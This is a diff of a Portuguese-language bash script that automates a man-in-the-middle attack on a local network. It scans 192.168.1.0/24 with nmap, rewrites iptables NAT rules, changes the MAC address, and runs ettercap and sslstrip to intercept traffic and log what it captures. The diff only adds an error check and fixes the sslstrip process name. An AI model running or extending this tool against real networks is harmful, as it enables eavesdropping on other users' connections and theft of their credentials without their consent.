@@ -4,7 +4,7 @@
 # Data: 2016/05/04
 # Autor: Joao Lucas 
 # Github: https://github.com/joao-lucas
-##
+#
 
 function menu() {
 
@@ -80,7 +80,6 @@ function limparRegrasdoIptables() {
 
 # opção 4
 function iniciarRegras() {
-        # criando regras no iptables
         echo "~> Criando regras no iptables..."
         sleep 2
         iptables -t nat -F
@@ -123,6 +122,15 @@ function mudarMacAddress() {
 
 function identificarHosts() {
         nmap -Pn -T 3 192.168.1.0/24 | tee $PREFIX/mitm_hosts.txt && egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' $PREFIX/mitm_hosts.txt | awk '{print $5}'
+        if [ $? -eq 0 ]
+        then
+                echo "[ OK ] Voltando ao menu."
+                sleep 2
+        else
+                echo "[ FALHA ] Ocorreram erros!"
+                sleep 2
+        fi
+
         sleep 2
         menu
 }
@@ -131,7 +139,7 @@ function iniciarSniffer() {
         # salvando em ...
         ettercap -G &
  
-        killall -TERM sslstripe
+        killall -TERM sslstrip
         xfce4-terminal -e sslstrip -w $PREFIX/$ARQUIVO
         tail -f $PREFIX/$ARQUIVO | tee mitm_output.txt
 }
